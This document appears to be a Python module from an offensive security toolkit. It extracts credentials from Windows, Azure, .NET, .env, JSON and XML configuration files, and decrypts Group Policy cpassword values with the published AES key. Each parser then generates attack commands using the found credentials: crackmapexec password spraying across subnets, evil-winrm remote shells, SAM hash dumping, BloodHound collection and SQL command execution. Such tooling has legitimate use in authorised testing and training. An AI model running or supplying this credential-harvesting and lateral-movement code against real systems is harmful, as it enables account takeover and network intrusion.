"""
Config File Credential Extraction Framework

Parses credentials from common configuration file formats found during
enumeration (SMB shares, web directories, etc.).

Each parser:
1. Detects if it can parse a file (extension + signature matching)
2. Extracts credentials with full provenance
3. Suggests next steps for exploitation (educational focus)

Example:
    registry = get_default_registry()
    result = registry.parse_file("azure.xml", content)

    for cred in result.credentials:
        print(f"Found: {cred.upn}")

    for step in result.next_steps:
        print(f"Next: {step}")
"""

import base64
import json
import re
import xml.etree.ElementTree as ET
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple

# Optional crypto for GPP decryption
try:
    from Cryptodome.Cipher import AES
    from Cryptodome.Util.Padding import unpad
    HAS_CRYPTO = True
except ImportError:
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import unpad
        HAS_CRYPTO = True
    except ImportError:
        HAS_CRYPTO = False

from ..core.models import (
    DiscoveredCredential,
    SecretType,
    SourceType,
    Confidence,
)


@dataclass
class NextStep:
    """
    Suggested next action after credential discovery.

    Provides both the command and educational context.
    """
    action: str           # Short description: "Validate credentials"
    command: str          # Actual command to run
    explanation: str      # Why this step matters
    priority: int = 1     # 1=high, 2=medium, 3=low

    def __str__(self) -> str:
        return f"[{self.priority}] {self.action}: {self.command}"


@dataclass
class ExtractionResult:
    """
    Result from parsing a config file.

    Contains extracted credentials AND suggested next steps,
    supporting both automation and learning.
    """
    credentials: List[DiscoveredCredential] = field(default_factory=list)
    next_steps: List[NextStep] = field(default_factory=list)
    parser_used: str = ""
    source_file: str = ""
    errors: List[str] = field(default_factory=list)

    @property
    def success(self) -> bool:
        return len(self.credentials) > 0

    def merge(self, other: "ExtractionResult") -> "ExtractionResult":
        """Merge another result into this one."""
        self.credentials.extend(other.credentials)
        self.next_steps.extend(other.next_steps)
        self.errors.extend(other.errors)
        return self


class ConfigParserBase(ABC):
    """
    Abstract base for config file credential parsers.

    Subclasses implement:
    - supported_extensions: File extensions this parser handles
    - file_signatures: Byte patterns that identify this file type
    - parse(): Extract credentials from content
    - get_next_steps(): Suggest exploitation steps
    """

    @property
    @abstractmethod
    def name(self) -> str:
        """Parser identifier for logging."""
        pass

    @property
    @abstractmethod
    def supported_extensions(self) -> Set[str]:
        """File extensions this parser handles (lowercase, with dot)."""
        pass

    @property
    @abstractmethod
    def file_signatures(self) -> List[bytes]:
        """
        Byte patterns that identify this file type.

        Parser will be tried if ANY signature matches.
        Use b'' for extension-only matching.
        """
        pass

    @abstractmethod
    def parse(self, content: bytes, source_path: str) -> List[DiscoveredCredential]:
        """
        Parse credentials from file content.

        Args:
            content: Raw file bytes
            source_path: Full path for provenance (e.g., "smb://host/share/file")

        Returns:
            List of discovered credentials
        """
        pass

    @abstractmethod
    def get_next_steps(
        self,
        credentials: List[DiscoveredCredential],
        context: Dict[str, str]
    ) -> List[NextStep]:
        """
        Suggest next steps after finding credentials.

        Args:
            credentials: Credentials found by this parser
            context: Additional context (target_ip, domain, etc.)

        Returns:
            Prioritized list of next actions
        """
        pass

    def can_parse(self, filename: str, content: bytes) -> bool:
        """
        Check if this parser can handle the file.

        Matches on extension AND/OR signature.
        """
        # Check extension
        ext = Path(filename).suffix.lower()
        ext_match = ext in self.supported_extensions

        # Check signatures
        sig_match = False
        if self.file_signatures:
            content_lower = content.lower() if isinstance(content, bytes) else content.encode().lower()
            for sig in self.file_signatures:
                if sig and sig.lower() in content_lower:
                    sig_match = True
                    break

        # Extension match OR signature match
        return ext_match or sig_match

    def _make_source_url(self, base_path: str, detail: str = "") -> str:
        """Create consistent source URL for provenance."""
        if detail:
            return f"{base_path}#{detail}"
        return base_path


class AzurePSCredentialParser(ConfigParserBase):
    """
    Parse Azure PowerShell credential XML files.

    Found in: User profiles, Azure automation scripts
    Format: PSADPasswordCredential serialized XML

    Example content:
        <Objs Version="1.1.0.1" xmlns="...powershell...">
          <Obj RefId="0">
            <TN RefId="0">
              <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
            </TN>
            <Props>
              <S N="Password">4n0therD4y@n0th3r$</S>
            </Props>
          </Obj>
        </Objs>
    """

    @property
    def name(self) -> str:
        return "azure_ps_credential"

    @property
    def supported_extensions(self) -> Set[str]:
        return {".xml", ".clixml"}

    @property
    def file_signatures(self) -> List[bytes]:
        return [
            b"PSADPasswordCredential",
            b"Microsoft.Azure.Commands.ActiveDirectory",
            b"schemas.microsoft.com/powershell",
        ]

    def parse(self, content: bytes, source_path: str) -> List[DiscoveredCredential]:
        credentials = []

        try:
            # Handle BOM and encoding
            text = content.decode('utf-8-sig', errors='ignore')

            # Extract password using regex (more robust than XML parsing for PS format)
            # Pattern: <S N="Password">value</S>
            password_pattern = rb'<S\s+N=["\']Password["\']>([^<]+)</S>'
            matches = re.findall(password_pattern, content, re.IGNORECASE)

            for match in matches:
                password = match.decode('utf-8', errors='ignore').strip()
                if password and len(password) > 0:
                    # Try to find associated username
                    username = self._extract_username(content)

                    credentials.append(DiscoveredCredential(
                        username=username or "unknown",
                        secret=password,
                        secret_type=SecretType.PASSWORD,
                        source=source_path,
                        source_type=SourceType.CONFIG_FILE,
                        confidence=Confidence.LIKELY,
                        notes="Azure AD PowerShell credential - check for password reuse",
                    ))

            # Also look for KeyCredential patterns
            key_pattern = rb'<S\s+N=["\']KeyId["\']>([^<]+)</S>'
            key_matches = re.findall(key_pattern, content, re.IGNORECASE)

        except Exception as e:
            pass  # Errors handled by registry

        return credentials

    def _extract_username(self, content: bytes) -> Optional[str]:
        """Try to extract username from nearby XML elements."""
        patterns = [
            rb'<S\s+N=["\']UserPrincipalName["\']>([^<]+)</S>',
            rb'<S\s+N=["\']DisplayName["\']>([^<]+)</S>',
            rb'<S\s+N=["\']Username["\']>([^<]+)</S>',
        ]
        for pattern in patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                return match.group(1).decode('utf-8', errors='ignore').strip()
        return None

    def get_next_steps(
        self,
        credentials: List[DiscoveredCredential],
        context: Dict[str, str]
    ) -> List[NextStep]:
        steps = []
        target = context.get("target_ip", "<TARGET>")
        domain = context.get("domain", "<DOMAIN>")

        for cred in credentials:
            user = cred.username

            # Step 1: Validate credential
            steps.append(NextStep(
                action="Validate Azure credential against AD",
                command=f"crackmapexec smb {target} -u '{user}' -p '{cred.secret}' -d {domain}",
                explanation="Azure AD credentials often reused for on-prem AD (password sync)",
                priority=1,
            ))

            # Step 2: Check WinRM access
            steps.append(NextStep(
                action="Test WinRM access",
                command=f"evil-winrm -i {target} -u '{user}' -p '{cred.secret}'",
                explanation="Azure admins often have Remote Management Users membership",
                priority=1,
            ))

            # Step 3: BloodHound collection
            steps.append(NextStep(
                action="Collect BloodHound data",
                command=f"bloodhound-python -c All -u '{user}' -p '{cred.secret}' -d {domain} -ns {target}",
                explanation="Map attack paths with valid credentials",
                priority=2,
            ))

        return steps


class WebConfigParser(ConfigParserBase):
    """
    Parse .NET Web.config and App.config files.

    Found in: IIS web roots, .NET application directories
    Contains: Connection strings, app settings with credentials

    Example:
        <connectionStrings>
          <add name="DB" connectionString="Server=sql;User Id=sa;Password=secret123"/>
        </connectionStrings>
    """

    @property
    def name(self) -> str:
        return "web_config"

    @property
    def supported_extensions(self) -> Set[str]:
        return {".config"}

    @property
    def file_signatures(self) -> List[bytes]:
        return [
            b"connectionString",
            b"<appSettings>",
            b"<configuration>",
            b"System.Web",
        ]

    def parse(self, content: bytes, source_path: str) -> List[DiscoveredCredential]:
        credentials = []
        text = content.decode('utf-8-sig', errors='ignore')

        # Parse connection strings
        conn_pattern = r'connectionString\s*=\s*["\']([^"\']+)["\']'
        for match in re.finditer(conn_pattern, text, re.IGNORECASE):
            conn_str = match.group(1)
            cred = self._parse_connection_string(conn_str, source_path)
            if cred:
                credentials.append(cred)

        # Parse appSettings for password keys
        setting_pattern = r'<add\s+key=["\']([^"\']*(?:password|pwd|secret|apikey|token)[^"\']*)["\'][\s\S]*?value=["\']([^"\']+)["\']'
        for match in re.finditer(setting_pattern, text, re.IGNORECASE):
            key, value = match.groups()
            if value and not value.startswith('{') and len(value) > 2:
                credentials.append(DiscoveredCredential(
                    username=key,  # Use key name as identifier
                    secret=value,
                    secret_type=SecretType.PASSWORD,
                    source=self._make_source_url(source_path, f"appSettings/{key}"),
                    source_type=SourceType.CONFIG_FILE,
                    confidence=Confidence.LIKELY,
                    notes=f"AppSetting key: {key}",
                ))

        return credentials

    def _parse_connection_string(
        self,
        conn_str: str,
        source_path: str
    ) -> Optional[DiscoveredCredential]:
        """Extract credentials from connection string."""
        # Common patterns
        patterns = {
            'user': r'(?:User\s*Id|UID|User)\s*=\s*([^;]+)',
            'password': r'(?:Password|PWD|Pass)\s*=\s*([^;]+)',
            'server': r'(?:Server|Data\s*Source|Host)\s*=\s*([^;]+)',
        }

        extracted = {}
        for key, pattern in patterns.items():
            match = re.search(pattern, conn_str, re.IGNORECASE)
            if match:
                extracted[key] = match.group(1).strip()

        if 'password' in extracted and extracted['password']:
            return DiscoveredCredential(
                username=extracted.get('user', 'unknown'),
                secret=extracted['password'],
                secret_type=SecretType.PASSWORD,
                source=self._make_source_url(source_path, "connectionString"),
                source_type=SourceType.CONFIG_FILE,
                confidence=Confidence.LIKELY,
                notes=f"SQL Server: {extracted.get('server', 'unknown')}",
            )
        return None

    def get_next_steps(
        self,
        credentials: List[DiscoveredCredential],
        context: Dict[str, str]
    ) -> List[NextStep]:
        steps = []
        target = context.get("target_ip", "<TARGET>")

        for cred in credentials:
            # Check if it's a SQL credential
            if 'SQL' in cred.notes or 'Server' in cred.notes:
                steps.append(NextStep(
                    action="Connect to SQL Server",
                    command=f"impacket-mssqlclient '{cred.username}:{cred.secret}'@{target}",
                    explanation="Database credentials may allow xp_cmdshell or data exfiltration",
                    priority=1,
                ))

                steps.append(NextStep(
                    action="Check SQL Server for command execution",
                    command=f"crackmapexec mssql {target} -u '{cred.username}' -p '{cred.secret}' -x 'whoami'",
                    explanation="xp_cmdshell enabled = instant RCE",
                    priority=1,
                ))

            # Generic password reuse check
            steps.append(NextStep(
                action="Test password reuse on AD",
                command=f"crackmapexec smb {target} -u '{cred.username}' -p '{cred.secret}'",
                explanation="Service account passwords often reused across systems",
                priority=2,
            ))

        return steps


class UnattendXmlParser(ConfigParserBase):
    """
    Parse Windows Unattend.xml deployment files.

    Found in: C:\\Windows\\Panther\\, SMB shares, SCCM deployments
    Contains: Local admin credentials, domain join accounts

    Passwords may be base64 encoded or plaintext.
    """

    @property
    def name(self) -> str:
        return "unattend_xml"

    @property
    def supported_extensions(self) -> Set[str]:
        return {".xml"}

    @property
    def file_signatures(self) -> List[bytes]:
        return [
            b"unattend",
            b"<AutoLogon>",
            b"<UserAccounts>",
            b"Microsoft-Windows-Shell-Setup",
        ]

    def parse(self, content: bytes, source_path: str) -> List[DiscoveredCredential]:
        credentials = []
        text = content.decode('utf-8-sig', errors='ignore')

        # AutoLogon credentials
        autologon_pattern = r'<AutoLogon>[\s\S]*?<Username>([^<]+)</Username>[\s\S]*?<Password>[\s\S]*?<Value>([^<]+)</Value>'
        for match in re.finditer(autologon_pattern, text, re.IGNORECASE):
            username, password = match.groups()
            password = self._decode_password(password)

            credentials.append(DiscoveredCredential(
                username=username.strip(),
                secret=password,
                secret_type=SecretType.PASSWORD,
                source=self._make_source_url(source_path, "AutoLogon"),
                source_type=SourceType.CONFIG_FILE,
                confidence=Confidence.LIKELY,
                notes="Windows AutoLogon credential",
            ))

        # LocalAccounts
        local_pattern = r'<LocalAccount[^>]*>[\s\S]*?<Name>([^<]+)</Name>[\s\S]*?<Password>[\s\S]*?<Value>([^<]+)</Value>'
        for match in re.finditer(local_pattern, text, re.IGNORECASE):
            username, password = match.groups()
            password = self._decode_password(password)

            credentials.append(DiscoveredCredential(
                username=username.strip(),
                secret=password,
                secret_type=SecretType.PASSWORD,
                source=self._make_source_url(source_path, "LocalAccounts"),
                source_type=SourceType.CONFIG_FILE,
                confidence=Confidence.LIKELY,
                notes="Local Administrator account from Unattend.xml",
            ))

        # Domain join credentials
        domain_pattern = r'<Credentials>[\s\S]*?<Username>([^<]+)</Username>[\s\S]*?<Password>([^<]+)</Password>'
        for match in re.finditer(domain_pattern, text, re.IGNORECASE):
            username, password = match.groups()
            password = self._decode_password(password)

            credentials.append(DiscoveredCredential(
                username=username.strip(),
                secret=password,
                secret_type=SecretType.PASSWORD,
                source=self._make_source_url(source_path, "DomainJoin"),
                source_type=SourceType.CONFIG_FILE,
                confidence=Confidence.CONFIRMED,  # High confidence for domain join
                notes="Domain join service account",
            ))

        return credentials

    def _decode_password(self, password: str) -> str:
        """Decode base64 password if encoded."""
        password = password.strip()
        try:
            # Try base64 decode
            decoded = base64.b64decode(password).decode('utf-16-le', errors='ignore')
            # Remove null bytes and trailing garbage
            decoded = decoded.rstrip('\x00').strip()
            if decoded and len(decoded) > 0:
                return decoded
        except:
            pass
        return password

    def get_next_steps(
        self,
        credentials: List[DiscoveredCredential],
        context: Dict[str, str]
    ) -> List[NextStep]:
        steps = []
        target = context.get("target_ip", "<TARGET>")
        domain = context.get("domain", "<DOMAIN>")

        for cred in credentials:
            if "Local" in cred.notes or "AutoLogon" in cred.notes:
                steps.append(NextStep(
                    action="Test local admin access",
                    command=f"crackmapexec smb {target} -u '{cred.username}' -p '{cred.secret}' --local-auth",
                    explanation="Unattend.xml local admin creds often reused across builds",
                    priority=1,
                ))

                steps.append(NextStep(
                    action="Spray local admin across subnet",
                    command=f"crackmapexec smb {target}/24 -u '{cred.username}' -p '{cred.secret}' --local-auth",
                    explanation="Same build image = same local admin password",
                    priority=2,
                ))

            if "Domain" in cred.notes:
                steps.append(NextStep(
                    action="Validate domain join account",
                    command=f"crackmapexec smb {target} -u '{cred.username}' -p '{cred.secret}' -d {domain}",
                    explanation="Domain join accounts often have elevated privileges",
                    priority=1,
                ))

        return steps


class GroupsPolicyParser(ConfigParserBase):
    """
    Parse Group Policy Preferences Groups.xml files.

    Found in: SYSVOL\\Policies\\{GUID}\\Machine\\Preferences\\Groups\\Groups.xml
    Contains: Local admin credentials (cpassword - AES encrypted, key is public)

    CVE: MS14-025 - cpassword can be trivially decrypted
    """

    # Microsoft published AES key (yes, really)
    GPP_KEY = bytes.fromhex(
        "4e9906e8fcb66cc9faf49310620ffee8"
        "f496e806cc057990209b09a433b66c1b"
    )

    @property
    def name(self) -> str:
        return "gpp_groups"

    @property
    def supported_extensions(self) -> Set[str]:
        return {".xml"}

    @property
    def file_signatures(self) -> List[bytes]:
        return [
            b"cpassword",
            b"Groups clsid=",
            b"<Groups ",
        ]

    def parse(self, content: bytes, source_path: str) -> List[DiscoveredCredential]:
        credentials = []
        text = content.decode('utf-8-sig', errors='ignore')

        # Extract User elements with cpassword
        user_pattern = r'<User[^>]*userName="([^"]*)"[^>]*cpassword="([^"]*)"'
        for match in re.finditer(user_pattern, text, re.IGNORECASE):
            username, cpassword = match.groups()

            if cpassword:
                password, was_decrypted = self._decrypt_cpassword(cpassword)
                if password:
                    credentials.append(DiscoveredCredential(
                        username=username,
                        secret=password,
                        secret_type=SecretType.PASSWORD,
                        source=self._make_source_url(source_path, "GPP"),
                        source_type=SourceType.GPP,
                        confidence=Confidence.CONFIRMED if was_decrypted else Confidence.LIKELY,
                        notes="GPP cpassword (MS14-025) - domain-wide local admin" + (
                            "" if was_decrypted else " [ENCRYPTED - use gpp-decrypt]"
                        ),
                    ))

        # Also check Properties elements
        prop_pattern = r'<Properties[^>]*userName="([^"]*)"[^>]*cpassword="([^"]*)"'
        for match in re.finditer(prop_pattern, text, re.IGNORECASE):
            username, cpassword = match.groups()
            if cpassword and username:
                password, was_decrypted = self._decrypt_cpassword(cpassword)
                if password:
                    credentials.append(DiscoveredCredential(
                        username=username,
                        secret=password,
                        secret_type=SecretType.PASSWORD,
                        source=self._make_source_url(source_path, "GPP"),
                        source_type=SourceType.GPP,
                        confidence=Confidence.CONFIRMED if was_decrypted else Confidence.LIKELY,
                        notes="GPP cpassword (MS14-025)" + (
                            "" if was_decrypted else " [ENCRYPTED - use gpp-decrypt]"
                        ),
                    ))

        return credentials

    def _decrypt_cpassword(self, cpassword: str) -> Tuple[Optional[str], bool]:
        """
        Decrypt GPP cpassword using the publicly known AES key.

        Microsoft published the key in MSDN documentation.

        Returns:
            Tuple of (password or cpassword, was_decrypted)
        """
        if not cpassword:
            return None, False

        if not HAS_CRYPTO:
            # Return raw cpassword - user can decrypt with gpp-decrypt
            return cpassword, False

        try:
            # Pad base64 string
            padded = cpassword + "=" * (4 - len(cpassword) % 4)
            encrypted = base64.b64decode(padded)

            # AES-256-CBC with null IV
            cipher = AES.new(self.GPP_KEY, AES.MODE_CBC, iv=b'\x00' * 16)
            decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)

            return decrypted.decode('utf-16-le', errors='ignore').rstrip('\x00'), True
        except Exception:
            return cpassword, False

    def get_next_steps(
        self,
        credentials: List[DiscoveredCredential],
        context: Dict[str, str]
    ) -> List[NextStep]:
        steps = []
        target = context.get("target_ip", "<TARGET>")

        for cred in credentials:
            steps.append(NextStep(
                action="Spray GPP password across all domain computers",
                command=f"crackmapexec smb {target}/24 -u '{cred.username}' -p '{cred.secret}' --local-auth",
                explanation="GPP sets SAME local admin password on ALL computers in scope",
                priority=1,
            ))

            steps.append(NextStep(
                action="Check for domain admin reuse",
                command=f"crackmapexec smb {target} -u '{cred.username}' -p '{cred.secret}'",
                explanation="Admins sometimes reuse GPP password for domain accounts",
                priority=2,
            ))

            steps.append(NextStep(
                action="Dump SAM/LSA if local admin",
                command=f"crackmapexec smb {target} -u '{cred.username}' -p '{cred.secret}' --local-auth --sam",
                explanation="Local admin = dump local hashes for cracking/PTH",
                priority=2,
            ))

        return steps


class EnvFileParser(ConfigParserBase):
    """
    Parse .env files (common in web applications).

    Found in: Web roots, application directories, Docker volumes
    Contains: API keys, database credentials, service tokens
    """

    @property
    def name(self) -> str:
        return "env_file"

    @property
    def supported_extensions(self) -> Set[str]:
        return {".env"}

    @property
    def file_signatures(self) -> List[bytes]:
        return [b""]  # Extension-only matching

    def parse(self, content: bytes, source_path: str) -> List[DiscoveredCredential]:
        credentials = []
        text = content.decode('utf-8', errors='ignore')

        # Pattern: KEY=value (with optional quotes)
        env_pattern = r'^([A-Z_][A-Z0-9_]*)\s*=\s*["\']?([^"\'#\n]+)["\']?'

        # Keywords that suggest credentials
        cred_keywords = {
            'password', 'passwd', 'pwd', 'secret', 'token', 'api_key',
            'apikey', 'auth', 'credential', 'private_key', 'access_key'
        }

        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith('#'):
                continue

            match = re.match(env_pattern, line, re.IGNORECASE)
            if match:
                key, value = match.groups()
                key_lower = key.lower()

                # Check if key suggests a credential
                is_cred = any(kw in key_lower for kw in cred_keywords)

                if is_cred and value and len(value) > 2:
                    credentials.append(DiscoveredCredential(
                        username=key,
                        secret=value.strip(),
                        secret_type=SecretType.PASSWORD,
                        source=self._make_source_url(source_path, key),
                        source_type=SourceType.CONFIG_FILE,
                        confidence=Confidence.LIKELY,
                        notes=f"Environment variable: {key}",
                    ))

        return credentials

    def get_next_steps(
        self,
        credentials: List[DiscoveredCredential],
        context: Dict[str, str]
    ) -> List[NextStep]:
        steps = []
        target = context.get("target_ip", "<TARGET>")

        for cred in credentials:
            key = cred.username.upper()

            if 'DB' in key or 'SQL' in key or 'MYSQL' in key or 'POSTGRES' in key:
                steps.append(NextStep(
                    action="Connect to database",
                    command=f"# Check DB type and connect with: mysql -u user -p / psql -U user",
                    explanation="Database credentials from .env often work on associated DB server",
                    priority=1,
                ))

            if 'API' in key or 'TOKEN' in key:
                steps.append(NextStep(
                    action="Test API token",
                    command=f"curl -H 'Authorization: Bearer {cred.secret}' https://{target}/api/",
                    explanation="API tokens may grant access to sensitive endpoints",
                    priority=2,
                ))

            # Always suggest password reuse check
            steps.append(NextStep(
                action="Test password reuse",
                command=f"crackmapexec smb {target} -u users.txt -p '{cred.secret}'",
                explanation="Developers often reuse passwords across services",
                priority=2,
            ))

        return steps


class GenericJsonParser(ConfigParserBase):
    """
    Parse JSON files for credential-like fields.

    Looks for common key names: password, secret, token, apiKey, etc.
    """

    @property
    def name(self) -> str:
        return "generic_json"

    @property
    def supported_extensions(self) -> Set[str]:
        return {".json"}

    @property
    def file_signatures(self) -> List[bytes]:
        return [b""]  # Extension-only

    def parse(self, content: bytes, source_path: str) -> List[DiscoveredCredential]:
        credentials = []

        try:
            text = content.decode('utf-8-sig', errors='ignore')
            data = json.loads(text)
            self._extract_from_dict(data, source_path, credentials, "")
        except json.JSONDecodeError:
            pass

        return credentials

    def _extract_from_dict(
        self,
        data,
        source_path: str,
        credentials: List[DiscoveredCredential],
        path: str
    ):
        """Recursively search JSON for credential fields."""
        cred_keys = {
            'password', 'passwd', 'pwd', 'secret', 'token', 'apikey',
            'api_key', 'auth', 'credential', 'private_key', 'access_key',
            'client_secret', 'connection_string'
        }

        if isinstance(data, dict):
            for key, value in data.items():
                current_path = f"{path}.{key}" if path else key
                key_lower = key.lower()

                if any(ck in key_lower for ck in cred_keys):
                    if isinstance(value, str) and len(value) > 2:
                        credentials.append(DiscoveredCredential(
                            username=key,
                            secret=value,
                            secret_type=SecretType.PASSWORD,
                            source=self._make_source_url(source_path, current_path),
                            source_type=SourceType.CONFIG_FILE,
                            confidence=Confidence.POSSIBLE,
                            notes=f"JSON path: {current_path}",
                        ))

                self._extract_from_dict(value, source_path, credentials, current_path)

        elif isinstance(data, list):
            for i, item in enumerate(data):
                self._extract_from_dict(item, source_path, credentials, f"{path}[{i}]")

    def get_next_steps(
        self,
        credentials: List[DiscoveredCredential],
        context: Dict[str, str]
    ) -> List[NextStep]:
        steps = []
        target = context.get("target_ip", "<TARGET>")

        if credentials:
            steps.append(NextStep(
                action="Validate discovered credentials",
                command=f"# Test each credential against relevant service",
                explanation="JSON configs may contain credentials for various services",
                priority=1,
            ))

            steps.append(NextStep(
                action="Check for password reuse",
                command=f"crackmapexec smb {target} -u users.txt -p passwords.txt",
                explanation="Spray discovered passwords against known users",
                priority=2,
            ))

        return steps


class GenericXmlParser(ConfigParserBase):
    """
    Parse XML files for credential-like elements.

    Fallback parser for XML files not matching specific patterns.
    """

    @property
    def name(self) -> str:
        return "generic_xml"

    @property
    def supported_extensions(self) -> Set[str]:
        return {".xml"}

    @property
    def file_signatures(self) -> List[bytes]:
        return [b""]  # Extension-only, lowest priority

    def parse(self, content: bytes, source_path: str) -> List[DiscoveredCredential]:
        credentials = []
        text = content.decode('utf-8-sig', errors='ignore')

        # Generic patterns for password elements/attributes
        patterns = [
            # <password>value</password>
            r'<([^>]*(?:password|passwd|pwd|secret|token|key)[^>]*)>([^<]+)</\1>',
            # <element password="value"/>
            r'(?:password|passwd|pwd|secret|token)=["\']([^"\']+)["\']',
            # <Password><Value>xxx</Value></Password>
            r'<(?:password|secret|token)>[\s\S]*?<value>([^<]+)</value>',
        ]

        for pattern in patterns:
            for match in re.finditer(pattern, text, re.IGNORECASE):
                value = match.group(match.lastindex) if match.lastindex else match.group(1)
                if value and len(value) > 2 and not value.startswith('{'):
                    credentials.append(DiscoveredCredential(
                        username="unknown",
                        secret=value.strip(),
                        secret_type=SecretType.PASSWORD,
                        source=source_path,
                        source_type=SourceType.CONFIG_FILE,
                        confidence=Confidence.POSSIBLE,
                        notes="Generic XML password extraction",
                    ))

        return credentials

    def get_next_steps(
        self,
        credentials: List[DiscoveredCredential],
        context: Dict[str, str]
    ) -> List[NextStep]:
        steps = []
        target = context.get("target_ip", "<TARGET>")

        if credentials:
            steps.append(NextStep(
                action="Identify credential context",
                command="# Review source XML to understand what service these credentials are for",
                explanation="Generic extraction - manual review needed to determine usage",
                priority=1,
            ))

            steps.append(NextStep(
                action="Spray against common services",
                command=f"crackmapexec smb {target} -u Administrator -p '<password>'",
                explanation="Try password against common administrative accounts",
                priority=2,
            ))

        return steps


class ConfigParserRegistry:
    """
    Registry of config file parsers.

    Automatically selects appropriate parser(s) based on file extension
    and content signatures. Supports parser chaining for comprehensive
    extraction.
    """

    def __init__(self):
        self._parsers: List[ConfigParserBase] = []

    def register(self, parser: ConfigParserBase) -> "ConfigParserRegistry":
        """Register a parser (chainable)."""
        self._parsers.append(parser)
        return self

    def parse_file(
        self,
        filename: str,
        content: bytes,
        context: Optional[Dict[str, str]] = None
    ) -> ExtractionResult:
        """
        Parse a file using all applicable parsers.

        Args:
            filename: Original filename (for extension matching)
            content: File content bytes
            context: Additional context for next steps generation

        Returns:
            ExtractionResult with credentials and next steps
        """
        context = context or {}
        result = ExtractionResult(source_file=filename)

        # Find applicable parsers
        applicable = [p for p in self._parsers if p.can_parse(filename, content)]

        if not applicable:
            result.errors.append(f"No parser found for: {filename}")
            return result

        # Try each applicable parser
        for parser in applicable:
            try:
                creds = parser.parse(content, filename)
                if creds:
                    result.credentials.extend(creds)
                    result.parser_used = parser.name

                    # Get next steps
                    steps = parser.get_next_steps(creds, context)
                    result.next_steps.extend(steps)

            except Exception as e:
                result.errors.append(f"{parser.name}: {str(e)}")

        # Deduplicate credentials
        seen = set()
        unique_creds = []
        for cred in result.credentials:
            key = (cred.username.lower(), cred.secret)
            if key not in seen:
                seen.add(key)
                unique_creds.append(cred)
        result.credentials = unique_creds

        # Sort next steps by priority
        result.next_steps.sort(key=lambda s: s.priority)

        return result

    def parse_all(
        self,
        files: Dict[str, bytes],
        context: Optional[Dict[str, str]] = None
    ) -> ExtractionResult:
        """
        Parse multiple files.

        Args:
            files: Dict mapping filename -> content
            context: Additional context

        Returns:
            Merged ExtractionResult
        """
        combined = ExtractionResult()

        for filename, content in files.items():
            result = self.parse_file(filename, content, context)
            combined.merge(result)

        return combined

    @property
    def parser_count(self) -> int:
        return len(self._parsers)

    def list_parsers(self) -> List[str]:
        return [p.name for p in self._parsers]


def get_default_registry() -> ConfigParserRegistry:
    """
    Get registry with all default parsers.

    Parser order matters - more specific parsers should come first.
    """
    registry = ConfigParserRegistry()

    # Register in order of specificity (most specific first)
    registry.register(GroupsPolicyParser())      # GPP - very specific
    registry.register(AzurePSCredentialParser()) # Azure PS - specific
    registry.register(UnattendXmlParser())       # Unattend - specific
    registry.register(WebConfigParser())         # .NET config
    registry.register(EnvFileParser())           # .env files
    registry.register(GenericJsonParser())       # JSON fallback
    registry.register(GenericXmlParser())        # XML fallback (last)

    return registry


def extract_from_file(
    filepath: str,
    context: Optional[Dict[str, str]] = None
) -> ExtractionResult:
    """
    Convenience function to extract credentials from a local file.

    Args:
        filepath: Path to file
        context: Optional context (target_ip, domain, etc.)

    Returns:
        ExtractionResult with credentials and next steps
    """
    path = Path(filepath)
    if not path.exists():
        result = ExtractionResult(source_file=filepath)
        result.errors.append(f"File not found: {filepath}")
        return result

    content = path.read_bytes()
    registry = get_default_registry()
    return registry.parse_file(path.name, content, context)


def extract_from_content(
    filename: str,
    content: bytes,
    context: Optional[Dict[str, str]] = None
) -> ExtractionResult:
    """
    Convenience function to extract credentials from content.

    Args:
        filename: Filename (for parser selection)
        content: File content bytes
        context: Optional context

    Returns:
        ExtractionResult with credentials and next steps
    """
    registry = get_default_registry()
    return registry.parse_file(filename, content, context)
